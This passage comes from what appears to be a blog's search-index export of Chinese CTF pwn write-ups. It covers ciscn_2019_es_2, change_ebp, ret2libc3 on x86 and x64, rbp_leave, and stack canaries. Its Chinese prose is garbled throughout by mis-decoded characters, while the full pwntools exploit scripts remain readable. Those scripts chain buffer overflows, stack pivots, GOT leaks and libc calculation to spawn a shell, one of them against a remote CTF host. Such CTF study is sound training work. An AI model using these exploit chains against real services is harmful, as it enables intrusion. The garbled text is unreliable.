â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† é¡µé¢è¾¹ç•Œï¼ˆ4KBå¯¹é½ï¼‰â€‹ â”‚ é¡µé¢1 â”‚â€‹ â”‚ â”‚0x80DB320 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† BSSæ®µå¼€å§‹â€‹ â”‚ BSSæ®µ â”‚â€‹ â”‚ â”‚0x80DBFFF â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â† é¡µé¢1ç»“æŸ0x80DC000 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† ä¸‹ä¸€ä¸ªé¡µé¢è¾¹ç•Œ","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"mprotect","slug":"mprotect","permalink":"http://example.com/tags/mprotect/"},{"name":"é™æ€ç¼–è¯‘","slug":"é™æ€ç¼–è¯‘","permalink":"http://example.com/tags/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"ciscn_2019_es_2","slug":"ciscn-2019-es-2","date":"2025-07-24T09:05:12.000Z","updated":"2025-09-03T10:55:35.047Z","comments":true,"path":"2025/07/24/ciscn-2019-es-2/","permalink":"http://example.com/2025/07/24/ciscn-2019-es-2/","excerpt":"","text":"é¢˜ç›® å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†æ˜¯å¯æ“ä½œç©ºé—´å¤ªå°ï¼Œåªèƒ½è¦†ç›–åˆ°retï¼Œæ‰€ä»¥è¦ç”¨æ ˆè¿ç§» æœ‰systemå‡½æ•°ï¼Œä½†æ˜¯éœ€è¦è‡ªå·±ä¼ å‚ï¼Œå¯ä»¥æŠŠ&#x2F;bin&#x2F;shå­—ç¬¦æ®µæ”¾åœ¨æ ˆä¸Š æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥å¯ä»¥ç”¨æ¥æ³„éœ²ebpçš„åœ°å€ ç¬¬äºŒæ¬¡è¦æ ¹æ®æ³„éœ²åœ°å€å»æ‰¾åŠ ä¸Šåç§»å¾—åˆ°sçš„å¤´éƒ¨ï¼Œåœ¨é‚£é‡Œæ„é€ æˆ‘ä»¬çš„åé—¨å‡½æ•°ï¼Œä¹‹åé€šè¿‡retè¿”å›så¤´éƒ¨æ‰§è¡Œè¿™ä¸ªåé—¨å‡½æ•°ã€‚ å…ˆæŸ¥çœ‹ebpè·ç¦»sçš„å®é™…è·ç¦»ï¼ˆgdbåŠ¨æ€è°ƒè¯•æŸ¥çœ‹ï¼‰ ç›¸è·0xffffcf18 - 0xffffcee0 &#x3D; 0x38 ä¸èƒ½ç›´æ¥é€šè¿‡ä¸‹é¢è¿™ç§æ–¹å¼æŸ¥çœ‹ï¼Œå› ä¸ºç°åœ¨çš„æ“ä½œç³»ç»Ÿé»˜è®¤å¼€å¯äº†ASLRï¼Œæ‰€ä»¥æ ˆä¸Šçš„åœ°å€ä¸€ç›´ä¼šå˜åŒ– æ¥ç€æ„é€ æˆ‘ä»¬çš„åé—¨å‡½æ•° ä¸”å› ä¸ºè·³è½¬åˆ°såè¿˜è¦æ‰§è¡Œï¼Œæ‰€ä»¥ç¨‹åºä¸èƒ½å´©æºƒ ï¼Œå¦‚æœså¯ä»¥ç›´æ¥è·³è½¬åˆ°åé—¨å‡½æ•°å°±å¯ä»¥ç›´æ¥æŠŠåœ°å€å†™åœ¨retä¸Š 123payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave) payload.ljust(0x28, b&#39;\\x00&#39;) ä¸­å¿…é¡»ä½¿ç”¨ b&#39;\\x00&#39; å› ä¸ºprintfä¼šåœ¨æ¥ä¸‹æ¥çš„æ•°æ®ä¸­æ‰¾ç¬¦åˆ%sçš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰â€&#x2F;x00â€ï¼Œä»–å¯èƒ½å»è¯»å–ç»§ç»­å¾€åè¯»åˆ°æ ˆä¸Šçš„æ•°æ®ï¼Œ%sæ—¶å­—ç¬¦ä¸²ï¼Œprintfè¯»åˆ°ä¸å¯æ‰“å°çš„å­—ç¬¦ä¼šå¼•å‘é”™è¯¯ leave retè§£é‡Š leave mov esp, ebp:æŠŠespç§»åŠ¨åˆ°ebp-0x38çš„ä½ç½®ï¼ˆebp-0x38)å…¶å®å°±æ˜¯aaaaçš„ä½ç½® pop ebpï¼šæŠŠaaaaè¿™ä¸€å—popå‡ºå»äº† ret pop eip:,æŠŠæ ˆé¡¶çš„systemå‡½æ•°popå‡ºå»ä½œä¸ºè¿”å›åœ°å€ è„šæœ¬1234567891011121314151617181920from pwn import *#p=process(&quot;./ciscn_2019_es_2&quot;)p=remote(&quot;node5.buuoj.cn&quot;,25671)sys=0x08048400main=0xdeadbeefleave=0x080485FDp.recvuntil(b&quot;name?\\n&quot;)payload=b&quot;a&quot;*0x27+b&quot;b&quot;p.send(payload)p.recvuntil(b&quot;b&quot;)s=u32(p.recv(4))-0x38print(hex(s))payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave)p.sendline(payload)p.interactive() æ”¶è·æ ˆç©ºé—´è¯†åˆ« 123åç§»é‡ â”‚ å¯„å­˜å™¨/æ ‡è¯†ç¬¦ | åœ°å€ | å†…å®¹ &lt;-- è§£é‡Š-------+------------------------------------------00:0000â”‚ esp 0xffffced0 â€”â–¸ 0x80486ca â—‚â€” dec eax /* &#x27;Hello, %s\\n&#x27; */ 0xffffced0: ESP å¯„å­˜å™¨å½“å‰æŒ‡å‘çš„å†…å­˜åœ°å€ã€‚ â€”â–¸ 0x80486ca: ESP æŒ‡å‘çš„å†…å­˜åœ°å€é‡Œå­˜å‚¨çš„å€¼ï¼Œå®ƒåˆæ˜¯ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘äº† 0x80486caã€‚ â—‚â€” dec eax /\\* &#39;Hello, %s\\n&#39; \\*/: å¯¹ 0x80486ca è¿™ä¸ªåœ°å€çš„åæ±‡ç¼–&#x2F;æ³¨é‡Šï¼Œè¿™é‡Œæ˜¾ç¤ºå®ƒæ˜¯ä¸€æ¡æŒ‡ä»¤çš„èµ·å§‹ï¼Œå¹¶ä¸”å…¶é™„è¿‘æœ‰å­—ç¬¦ä¸² â€œHello, %s\\nâ€ã€‚ è¦æ‰¾åˆ°å­˜æ”¾å†…å®¹æ˜¯111111çš„ä½ç½®ï¼Œå°±æ˜¯11111ç›´æ¥æŒ‡å‘çš„ä½ç½®0xffffcee0 espä¸sçš„è·ç¦»ä¸€ç›´ç–‘æƒ‘ä¸æ˜¯ç›¸è·0x28å—ï¼Œä¸ºä»€ä¹ˆè¦çœ‹è¿™ä¸ª0x38,çœ‹äº†å¾ˆå¤šå¤§ä½¬çš„wpä¹Ÿæ²¡æœ‰è¯´çš„ï¼ŒæŸ¥äº†æ‰çŸ¥é“è¿˜è¦è€ƒè™‘å †æ ˆå¹³è¡¡:joy: ğŸ§  å…³é”®ç‚¹åœ¨äºï¼š 1char s[0x28]; è¿™ä¸ªæ•°ç»„è™½ç„¶æ˜¯ 0x28 å­—èŠ‚ï¼Œä½† å®ƒä¸æ˜¯ä» ebp - 0x28 åˆ° ebpï¼Œè€Œæ˜¯ä» ebp - 0x2c åˆ° ebp - 4ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œç¼–è¯‘å™¨ä¼šï¼š ä¸ºå˜é‡ s[0x28] åˆ†é… 0x28 å­—èŠ‚ï¼› è¿˜ä¼šé¢å¤–åˆ†é… å¯¹é½ç©ºé—´ï¼ˆpaddingï¼‰ï¼Œä½¿æ•´ä¸ªæ ˆå¸§æ˜¯å¯¹é½çš„ï¼› æ‰€ä»¥ï¼ŒçœŸæ­£å˜é‡èµ·å§‹åœ°å€æ˜¯ ebp - 0x2cï¼Œä¸æ˜¯ ebp - 0x28ã€‚ ğŸ‘‰ åœ¨ 32 ä½ç¨‹åºä¸­ï¼Œå˜é‡ char s[0x28] é€šå¸¸ä» ebp - 0x2c å¼€å§‹ï¼Œè€Œä¸æ˜¯ ebp - 0x28ã€‚ åœ¨ 32 ä½ç¨‹åºé‡Œï¼Œesp åœ¨å»ºç«‹æ ˆå¸§æ—¶ï¼Œå¸¸å¸¸æ˜¯ ä¸ºäº†ç»™å±€éƒ¨å˜é‡å’Œè¿”å›åœ°å€å¯¹é½åˆ° 16 å­—èŠ‚ï¼Œå› æ­¤ä¼šå¤šåˆ†é…å‡ ä¸ªå­—èŠ‚ï¼› æ‰€ä»¥ sub esp, 0x2c æ˜¯éå¸¸å¸¸è§çš„ï¼› å³ä½¿å˜é‡åªæœ‰ 0x28 å­—èŠ‚ï¼Œç¼–è¯‘å™¨ä¼šé¢å¤–å¤šç»™ 4 å­—èŠ‚ paddingï¼Œå½¢æˆ 0x2cã€‚ åœ¨è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°å®ƒå¼€è¾Ÿäº†ä¸æ­¢0x28ä¸ªç©ºé—´ï¼Œæ‰€ä»¥æ‰è¦gdbè°ƒè¯•çœ‹å®ƒå®é™…çš„ 1234567891011121314151617181920212223242526272829303132333435 é«˜åœ°å€ (æ ˆåº•ï¼Œå‘é«˜åœ°å€å¢é•¿) ^ |+-----------------+-------------------+| å‡½æ•°å‚æ•° | |+-----------------+-------------------+| è¿”å›åœ°å€ | | (è°ƒç”¨ func() åè¿”å›åˆ°è¿™é‡Œçš„åœ°å€)+-----------------+-------------------+| ä¿å­˜çš„æ—§ EBP | (OLD_SAVED_EBP) | &lt;- (0x080485FD - leave; ret å¤„çš„ EBP å€¼)+-----------------+-------------------+| Padding | (é€šå¸¸æ˜¯ 4 å­—èŠ‚) | &lt;- (å¦‚æœä½ è¯´ s ä» ebp - 0x2c å¼€å§‹ï¼Œé‚£ä¹ˆè¿™éƒ¨åˆ†æ˜¯ ebp-0x2c åˆ° ebp-0x28 ä¹‹é—´çš„å¡«å……)+-----------------+-------------------+ &lt;- **ebp - 0x28**| | || | || | || | || | || char s[0x28] | || | || | || | || | || | || | |+-----------------+-------------------+ &lt;- **ebp - 0x2c** (æ•°ç»„ s çš„èµ·å§‹åœ°å€)| å…¶ä»–å±€éƒ¨å˜é‡ | || ï¼ˆå¦‚æœæœ‰ï¼‰ | |+-----------------+-------------------+| ...... | |+-----------------+-------------------+| å½“å‰ ESP | | &lt;- (ESP å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€)+-----------------+-------------------+ | v ä½åœ°å€ (æ ˆé¡¶ï¼Œå‘ä½åœ°å€å¢é•¿)","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"æ ˆæº¢å‡ºè¿›é˜¶","slug":"æ ˆæº¢å‡ºè¿›é˜¶","date":"2025-07-23T06:16:44.000Z","updated":"2025-08-26T09:08:34.962Z","comments":true,"path":"2025/07/23/æ ˆæº¢å‡ºè¿›é˜¶/","permalink":"http://example.com/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/","excerpt":"","text":"æ ˆè¿ç§»change_ebpï¼ˆæ ˆåŠ«æŒDemo1ï¼‰ æœ€å¤šå¡«å……12ä¸ªå­—èŠ‚ï¼Œåªèƒ½è¦†ç›–åˆ°ebp å†™å…¥çš„magicçš„èŒƒå›´åˆ°0x0804A380ï½0x0804A38C æ‰€ä»¥æ ˆè¿ç§» è„šæœ¬1234567891011121314from pwn import *p = process(&quot;./change_ebp&quot;)gdb.attach(p,&quot;b *0x080485D3&quot;)backdoor = 0x0804850Bmagic_addr = 0x0804A380p.recvuntil(&quot;leave your name\\n&quot;)payload = &quot;junk&quot; + p32(backdoor) + p32(magic_addr)p.send(payload)p.interactive() ebp çš„ä½œç”¨åœ¨å‡½æ•°è°ƒç”¨æ—¶ï¼Œebp ç”¨äºï¼š å®šä½å±€éƒ¨å˜é‡ï¼ˆå¦‚ v1 ä½äº ebp-8ï¼‰ã€‚ åœ¨å‡½æ•°è¿”å›æ—¶æ¢å¤è°ƒç”¨è€…çš„æ ˆå¸§ï¼ˆé€šè¿‡ leave æŒ‡ä»¤ï¼‰ã€‚ å…¸å‹å‡½æ•°å°¾å£°ï¼ˆleave; retï¼‰ï¼š 12leave ; ç›¸å½“äº mov esp, ebp; pop ebpret ; pop eipï¼Œè·³è½¬åˆ°è¿”å›åœ°å€ leave ä¼šï¼š æŠŠ ebp çš„å€¼èµ‹ç»™ espï¼ˆæ ˆæŒ‡é’ˆæŒ‡å‘ ebpï¼‰ã€‚ ç„¶å pop ebpï¼ˆæ¢å¤è°ƒç”¨è€…çš„ ebpï¼‰ã€‚ ret ä¼š pop eipï¼ˆè·³è½¬åˆ°è¿”å›åœ°å€ï¼‰ã€‚ (1) leave æŒ‡ä»¤çš„æ‰§è¡Œ mov esp, ebpï¼š åŸæœ¬ ebp æŒ‡å‘æ ˆå¸§åŸºå€ï¼Œä½†å·²ç»è¢«è¦†ç›–ä¸º magic_addrï¼ˆ0x0804A380ï¼‰ã€‚ æ‰€ä»¥ esp ç°åœ¨æŒ‡å‘ magic_addrï¼ˆå…¨å±€å˜é‡ magic çš„åœ°å€ï¼‰ã€‚ pop ebpï¼š ä» espï¼ˆmagic_addrï¼‰å¼¹å‡ºä¸€ä¸ªå€¼åˆ° ebpã€‚ å¦‚æœ magic åŒºåŸŸæ²¡æœ‰ç‰¹æ®Šæ„é€ ï¼Œè¿™é‡Œå¯èƒ½ä¸é‡è¦ã€‚ (2) ret æŒ‡ä»¤çš„æ‰§è¡Œ pop eipï¼š ä» espï¼ˆmagic_addr + 4ï¼‰å¼¹å‡ºä¸€ä¸ªå€¼åˆ° eipï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰ã€‚ å…³é”®ç‚¹ï¼š magic_addr + 4 æ˜¯ magic å˜é‡çš„ç¬¬ 5-8 å­—èŠ‚ã€‚ æ”»å‡»è€…å·²ç»é€šè¿‡ read(0, &amp;magic, 0xCu) å‘ magic å†™å…¥äº† 12 å­—èŠ‚æ•°æ®ã€‚ å¦‚æœ magic + 4 å¤„å­˜æ”¾çš„æ˜¯ backdoor åœ°å€ï¼Œret å°±ä¼šè·³è½¬åˆ° backdoorï¼ ret2libc3(æ ˆåŠ«æŒDemo2) åœ¨è¿™é‡Œä»‹ç»ä¸€ç§æ–°çš„åŠæ³•ï¼Œä½¿å‡½æ•°å¯ä»¥ä¸è¿”å›mainå‡½æ•° è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637from pwn import *p = process(&quot;./ret2libc3&quot;)gdb.attach(p,&quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]gets_plt = elf.plt[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]# ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;pop_ebp_ret = 0x080485db# ROPgadget --binary ./ret2libc3 | grep leaveleave_ret = 0x08048448rop_addr = 0x804a800p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = &quot;a&quot; * 0x108 + &quot;junk&quot;payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)p.sendline(payload1)leak_addr = u32(p.recv(4))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = b&quot;A&quot; * 0x108 # å¡«å……ç¼“å†²åŒºpayload2 += p32(system) # è°ƒç”¨ systempayload2 += p32(0) # è¿”å›åœ°å€ï¼ˆä¸é‡è¦ï¼Œå› ä¸ºç›´æ¥æ‹¿ shellï¼‰payload2 += p32(binsh) # system çš„å‚æ•°p.sendline(payload2)p.interactive() ç¬¬ä¸€ä¸ªpaylaod1payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got) è¾“å‡ºgetsçš„gotè¡¨åœ°å€ï¼Œæ–¹ä¾¿å¯»æ‰¾libcåŸºå€ ç„¶åp32(pop_ebp_ret)å–å‡ºä¸¤ä¸ªåœ°å€ï¼Œä¸€ä¸ªæ”¾è¿›ebp,ä¸€ä¸ªæ”¾å…¥eip(retæŒ‡ä»¤)ï¼Œæ”¾è¿›eipçš„ä¹Ÿå°±æ˜¯p32(gets_plt)ï¼Œæ­£å¥½æ¥ä¸Šä¸‹ä¸€æ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œã€‚ 1payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr) è°ƒç”¨getsçš„pltè¡¨ï¼Œåˆäº§ç”Ÿäº†ä¸€ä¸ªè¾“å…¥æœºä¼š 1payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret) æŠŠrop_addr - 4ä½œä¸ºebpï¼Œæ‰€ä»¥ç¨‹åºä¼šè·³è½¬åˆ°è¿™é‡Œ è€Œrop_addr çš„æ•°æ®å¯ä»¥æœ‰payload2å¡«å…¥ï¼Œç²¾å¿ƒæ„é€ å³å¯ ç¬¬äºŒä¸ªpaylaodå¡«å…¥äº†ä¸Šé¢çš„è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºè¿›å…¥systemå‡½æ•°ï¼Œå†æ„é€ systemå‡½æ•°çš„å‚æ•°&#x2F;bin&#x2F;sh å°±æ„é€ å¥½äº†åé—¨å‡½æ•° x64çš„æƒ…å†µå…¶å®å·®ä¸å¤šï¼Œå°±æ˜¯å…ˆä¼ å…¥å‚æ•° 1234567891011121314151617181920212223242526272829303132333435from pwn import *p = process(&quot;./ret2libc3_x64&quot;)gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]gets_plt = elf.plt[&quot;gets&quot;]rop_addr = 0x601800# ROPgadget --binary ./ret2libc3_x64 --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x0000000000400783pop_rsp3 = 0x000000000040077d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; retp.recvuntil(&quot;ret2libc3_x64\\n&quot;)payload1 = &quot;a&quot; * 0x100 + &quot;junkjunk&quot;payload1 += p64(rdi) + p64(gets_got)payload1 += p64(puts_plt)payload1 += p64(rdi) + p64(rop_addr)payload1 += p64(gets_plt)payload1 += p64(pop_rsp3) + p64(rop_addr - 0x18)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.sendline(payload2)p.interactive() rbp_leave(æ ˆåŠ«æŒDemo3) v1å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†å¯è¾“å…¥çš„å­—ç¬¦æ•°å¤ªå°‘ æœ€å¤šè¦†ç›–åˆ°è¿”å›åœ°å€å¤„ï¼Œæ— æ³•ç›´æ¥rop æ‰€ä»¥è€ƒè™‘ç”¨nameæ¥æ„é€ ï¼Œç„¶åç”¨v1è½¬è¿‡å» è„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import *p = process(&quot;./rbp_leave&quot;)#gdb.attach(p,&quot;b *0x000000000040073F&quot;)elf = ELF(&quot;./rbp_leave&quot;)name_addr = 0x6010A0# ROPgadget --binary ./rbp_leave --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x4007c3rsi2 = 0x4007c1pop_rsp3 = 0x4007bd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret# ROPgadget --binary ./rbp_leave | grep leaveleave_ret = 0x4006f0 # leave ; retret = 0x4006f1read_input = 0x4006C7rop_addr2 = name_addr + 0x800name = p64(ret) *20name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;])name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input)name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)p.sendafter(b&quot;leave your name\\n&quot;,name.ljust(0x400,b&quot;\\x00&quot;))payload1 = b&quot;a&quot; * 0x100payload1 += p64(name_addr - 8)payload1 += p64(leave_ret)p.sendafter(&quot;try to break it\\n&quot;,payload1)leak_addr = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;))libc=LibcSearcher(&quot;read&quot;,leak_addr)libc_base = leak_addr - libc.dump(&quot;read&quot;)libc.address = libc_baseprint(hex(libc.address))system = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.send(payload2)p.interactive() ç¬¬ä¸€ä¸ªpayload12name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;]) è°ƒç”¨putså‡½æ•°æ‰“å°readçš„gotè¡¨åœ°å€ 123name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input) è°ƒç”¨readå‡½æ•°ï¼Œreadçš„å‚æ•°æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥å¤šç”¨äº†å‡ ä¸ªå¯„å­˜å™¨ï¼ŒæŠŠä»ç»ˆç«¯è¾“å…¥çš„æ•°æ®æ”¾åœ¨p64(rop_addr2)çš„ä½ç½®ä¸Š 1name += p64(pop_rsp3) + p64(rop_addr2 - 0x18) å› ä¸ºp64(pop_rsp3)æœ‰ä¸‰ä¸ªpopæŒ‡ä»¤ï¼Œæ‰€ä»¥æœ‰è¦ç©ºå‡ºè¶³å¤Ÿçš„è·ç¦»ï¼Œé˜²æ­¢æŠŠé‡è¦æ•°æ®å¼¹å‡ºäº† ç¬¬äºŒä¸ªpayloadå¡«è¡¥v1 12payload1 += p64(name_addr - 8)payload1 += p64(leave_ret) p64(name_addr - 8)ï¼šè¦†ç›– RBP ç›®æ ‡ï¼šå°† RBP ä¿®æ”¹ä¸º name_addr - 8ã€‚ ä¸ºä»€ä¹ˆæ˜¯ name_addr - 8ï¼Ÿ leave æŒ‡ä»¤ä¼šæ‰§è¡Œ mov rsp, rbpï¼Œå› æ­¤ rsp å°†æŒ‡å‘ name_addr - 8ã€‚ æ¥ä¸‹æ¥çš„ ret ä¼šä» name_addrï¼ˆå³ name çš„èµ·å§‹åœ°å€ï¼‰å¼€å§‹æ‰§è¡Œ ROP é“¾ã€‚ -8 çš„è°ƒæ•´ï¼šå› ä¸º leave ä¹‹åä¼š pop rbpï¼Œrsp ä¼š +8ï¼Œæœ€ç»ˆæŒ‡å‘ name_addrã€‚ ç¬¬ä¸‰ä¸ªpayload12payload2 = p64(rdi) + p64(binsh)payload2 += p64(system) ä¸ºç¬¬ä¸€ä¸ªpayloadæä¾›çš„readè¾“å…¥ ç»¼ä¸Šæ‰€è¿° é€šè¿‡0å’Œ2æ„é€ å®Œæ•´çš„åé—¨å‡½æ•°ï¼Œç„¶åé€šè¿‡1è¿›å…¥æ‰§è¡Œè¿™ä¸ªåé—¨å‡½æ•° è„šæœ¬ å¦‚ä½•é€‰æ‹©åˆé€‚çš„ rop_addr2ï¼Ÿ æ–¹æ³• 1ï¼šä½¿ç”¨ name çš„æ‰©å±•åŒºåŸŸ å¦‚æœ name çš„å¤§å°æ˜¯ 0x400ï¼Œå¯ä»¥é€‰æ‹© name_addr + 0x400 ä¹‹åçš„åœ°å€ï¼ˆå¦‚ name_addr + 0x800ï¼‰ã€‚ ä¼˜ç‚¹ï¼šç®€å•ç›´æ¥ï¼Œæ— éœ€é¢å¤–æ³„éœ²åœ°å€ã€‚ ç¼ºç‚¹ï¼šéœ€ç¡®ä¿ name åŒºåŸŸè¶³å¤Ÿå¤§ï¼ˆæˆ–ç¨‹åºå…è®¸è¶Šç•Œå†™å…¥ï¼‰ã€‚ æ–¹æ³• 2ï¼šä½¿ç”¨ libc ä¸­çš„å¯å†™æ®µ libc ä¸­æœ‰è®¸å¤šå¯å†™åŒºåŸŸï¼ˆå¦‚ __malloc_hookã€__free_hook é™„è¿‘ï¼‰ã€‚ æ­¥éª¤ï¼š æ³„éœ² libc åŸºå€ï¼ˆå¦‚é€šè¿‡ puts(read_got)ï¼‰ã€‚ è®¡ç®—ç›®æ ‡åœ°å€ï¼ˆå¦‚ libc_base + 0x3c4b00ï¼‰ã€‚ ä¼˜ç‚¹ï¼šç¨³å®šï¼Œé€‚åˆå¤§å‹ ROP é“¾ã€‚ ç¼ºç‚¹ï¼šéœ€è¦å…ˆæ³„éœ² libc åœ°å€ã€‚ æ–¹æ³• 3ï¼šä½¿ç”¨å †ï¼ˆHeapï¼‰ å¦‚æœç¨‹åºè°ƒç”¨äº† mallocï¼Œå †åœ°å€å¯èƒ½å¯é¢„æµ‹ã€‚ æ­¥éª¤ï¼š æ³„éœ²å †åœ°å€ï¼ˆå¦‚é€šè¿‡ puts(malloc_got)ï¼‰ã€‚ é€‰æ‹©å †å—ä¸­çš„ç©ºé—²åŒºåŸŸã€‚ ä¼˜ç‚¹ï¼šç©ºé—´å¤§ï¼Œä¸æ˜“å†²çªã€‚ ç¼ºç‚¹ï¼šéœ€è¦å †æ³„éœ²ã€‚ canaryä¿æŠ¤Canaryçš„è®¾è®¡æ€æƒ³ç®€å•é«˜æ•ˆï¼Œå°±æ˜¯åœ¨æ ˆæº¢å‡ºå‘ç”Ÿçš„é«˜å±åŒºåŸŸçš„å°¾éƒ¨æ’å…¥ä¸€ä¸ªå€¼ï¼Œå½“å‡½æ•°è¿”å›æ—¶æ£€æµ‹Canaryçš„å€¼æ˜¯å¦å‘ç”Ÿäº†æ”¹å˜ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º&#x2F;ç¼“å†²åŒºæº¢å‡ºã€‚ ä¿æŠ¤åŸç†å½“ç¨‹åºå¯ç”¨Canaryç¼–è¯‘å æ’å…¥Canaryå€¼ 12mov raxï¼Œqword ptr fs:[0x28]mov qword ptr[rbp-8]ï¼Œrax æ£€æŸ¥ 1234moV rdx,QWORD PTR [rbp-0x8]xOr rdx,QWORD PTR fs:0x28je0x4005d7&lt;main+65&gt;call 0x400460&lt;_stack_chk_fail@plt&gt; å¦‚æœæ£€æµ‹å‡ºCanaryçš„å€¼è¢«ä¿®æ”¹è¿‡ï¼Œåˆ™ä¼šè¿è¡Œåˆ°__stack_chk_failå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ä½äºglibcä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ç»è¿‡ELFçš„å»¶è¿Ÿç»‘å®šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œstack_chk_failæ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œå½“ç¨‹åºæ²¡æœ‰å¼€å¯FULL RELROä¿æŠ¤æ—¶ï¼Œå¯ä»¥è¢«GOTåŠ«æŒæ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥å…ˆåŠ«æŒstack_chk_failå‡½æ•°çš„GOTï¼Œå†è§¦å‘Canaryæ£€æµ‹æŠ¥é”™ï¼Œè¿™æ—¶å°±ä¼šè¿›å…¥åŠ«æŒçš„åœ°å€ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§åˆ©ç”¨æ€è·¯ åœ¨ Linux x86-64 æ¶æ„ä¸‹ï¼ŒCanaryï¼ˆä¹Ÿç§°ä¸º stack_guard æˆ–æ ˆä¿æŠ¤å€¼ï¼‰é€šå¸¸å¹¶ä¸æ˜¯ç›´æ¥å­˜å‚¨åœ¨æ ˆä¸Šï¼ˆé‚£æ ·å®ƒå°±å®¹æ˜“è¢«æº¢å‡ºï¼‰ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªçº¿ç¨‹æœ¬åœ°å­˜å‚¨ (TLS) åŒºåŸŸä¸­ã€‚ åœ¨ x86-64 Linux ç³»ç»Ÿä¸­ï¼Œfs å¯„å­˜å™¨ï¼ˆæˆ–è€… gs å¯„å­˜å™¨ï¼‰è¢«æ“ä½œç³»ç»Ÿç”¨äºæŒ‡å‘å½“å‰çº¿ç¨‹çš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨ (TLS) åŒºåŸŸã€‚ GCC 